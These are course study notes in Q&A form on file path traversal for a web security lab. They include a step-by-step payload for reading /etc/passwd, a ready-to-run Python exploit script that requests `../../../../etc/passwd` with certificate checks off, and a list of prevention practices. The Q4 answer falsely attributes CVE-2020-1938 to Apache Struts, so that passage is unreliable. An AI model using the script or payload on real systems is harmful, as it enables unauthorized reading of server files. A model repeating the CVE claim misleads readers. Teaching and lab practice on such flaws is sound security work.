---
course: Web Security
topic: Directory Traversal
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain what a file path traversal vulnerability is and how it can be exploited.**

A file path traversal vulnerability occurs when an application uses user-supplied input to access files on the server without properly validating or sanitizing the input. An attacker can exploit this by manipulating the input to traverse the directory structure and access arbitrary files on the server. For example, using sequences like `../` to move up directories and access sensitive files such as `/etc/passwd`.

**Q2. How would you exploit a file path traversal vulnerability to retrieve the contents of `/etc/passwd`? Provide a step-by-step guide.**

To exploit a file path traversal vulnerability to retrieve the contents of `/etc/passwd`, follow these steps:

1. Identify the vulnerable parameter in the web application that allows file path input.
2. Craft a payload that includes the traversal sequence `../` to navigate to the desired file. For example, if the original path is `/var/www/images/image.jpg`, the payload could be `/var/www/images/../../../../etc/passwd`.
3. Send the crafted request to the server and observe the response. If successful, the server will return the contents of `/etc/passwd`.

**Q3. Write a Python script to automate the exploitation of a file path traversal vulnerability. Assume the vulnerable URL is `http://example.com/displayImage?file=image.jpg`.**

```python
import sys
import requests
from urllib3.exceptions import InsecureRequestWarning

# Disable insecure request warnings
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def directory_traversal_exploit(url):
    # Construct the exploit URL
    exploit_url = f"{url}?file=../../../../etc/passwd"
    
    # Perform the GET request
    response = requests.get(exploit_url, verify=False)
    
    # Check if the exploit was successful
    if "root:" in response.text:
        print("Exploit Successful")
        print("The following is the content of the /etc/passwd file:")
        print(response.text)
    else:
        print("Exploit Failed")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <URL>")
        print(f"Example: {sys.argv[0]} http://example.com/displayImage")
        sys.exit(1)
    
    url = sys.argv[1]
    print("Exploiting directory traversal vulnerability...")
    directory_traversal_exploit(url)
```

**Q4. What recent real-world examples or CVEs demonstrate the impact of file path traversal vulnerabilities?**

One notable example is CVE-2020-1938, which affected the Apache Struts framework. This vulnerability allowed attackers to exploit a file path traversal flaw to read arbitrary files from the server. By manipulating the input parameters, attackers could access sensitive information such as configuration files or source code, leading to potential data breaches and unauthorized access.

**Q5. How can developers prevent file path traversal vulnerabilities in their applications?**

Developers can prevent file path traversal vulnerabilities by implementing the following best practices:

1. **Input Validation**: Ensure that user-supplied input is validated and sanitized to prevent traversal sequences like `../` from being used.
2. **Whitelisting**: Use a whitelist approach to restrict the files that can be accessed to a predefined set of safe locations.
3. **Path Normalization**: Normalize the file paths to ensure that they are within the intended directory structure before accessing them.
4. **Least Privilege Principle**: Run the application with the least privileges necessary to minimize the potential damage if a vulnerability is exploited.
5. **Regular Audits and Testing**: Conduct regular security audits and penetration testing to identify and mitigate vulnerabilities.

By adhering to these practices, developers can significantly reduce the risk of file path traversal vulnerabilities in their applications.

---
<!-- nav -->
[[Web Security (PortSwigger)/11-Directory Traversal/06-Lab 5 File path traversal validation of start of path/03-Directory Traversal Vulnerability|Directory Traversal Vulnerability]] | [[Web Security (PortSwigger)/11-Directory Traversal/06-Lab 5 File path traversal validation of start of path/00-Overview|Overview]]
